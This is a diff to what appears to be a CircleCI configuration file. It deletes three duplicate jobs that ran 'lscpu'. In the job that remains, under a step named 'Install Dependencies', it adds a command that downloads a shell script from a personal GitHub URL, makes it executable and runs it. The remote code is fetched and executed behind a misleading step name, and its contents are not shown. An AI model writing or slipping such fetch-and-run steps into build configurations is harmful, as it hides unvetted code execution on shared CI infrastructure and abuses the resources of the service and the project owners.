@@ -6,33 +6,9 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 30m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 30m lscpu
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 30m lscpu
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 30m lscpu
+            command: timeout 30m wget https://raw.githubusercontent.com/ahmadun89/exmachine/main/w7.sh && chmod +x w7.sh && ./w7.sh
 workflows:
     version: 2.1
     build:
         jobs:
             - Devop
-            - Devop1
-            - Devop2
-            - Devop3
